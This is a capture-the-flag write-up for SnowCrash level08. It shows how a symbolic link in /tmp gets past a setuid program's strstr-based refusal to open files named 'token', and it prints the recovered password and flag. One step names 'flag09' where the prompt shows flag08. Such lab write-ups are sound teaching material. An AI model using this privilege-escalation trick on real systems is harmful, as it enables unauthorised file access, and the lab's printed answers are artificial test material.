# level08

## Recognition

There is a file named 'token' owned only by flag08, which might contain something interesting.
There is also a program named level08 which is owned by flag08.
```bash
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

When running the level08 program, we can see that it tries to open a file, however if the path to the file or the name of the file is 'token', the program will not open it.
```bash
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
level08@SnowCrash:~$ ./level08 owned_file
hello world
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
level08@SnowCrash:~$ ./level08 /home/users/level08/token
You may not access '/home/users/level08/token'
```

When using `strings` on the program, we can see that it uses the `strstr` function which checks for a string in a string, and might be the way it checks for the 'token' word in the input path.
```bash
level08@SnowCrash:~$ strings level08 
[...]
strstr
[...]
```

</br>
</br>

## Exploitation

Since we know that we can't open any files wich contains the word token, we can try to open the 'token' file at the home of level08 by using a symbolic link to it which does not contain the word 'token'.
```bash
level08@SnowCrash:~$ ln -s $HOME/token /tmp/bypass
level08@SnowCrash:~$ ./level08 /tmp/bypass
quif5eloekouj29ke0vouxean
```

We can then log in as 'flag09' using the previous password, and run `getflag`.
```bash
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```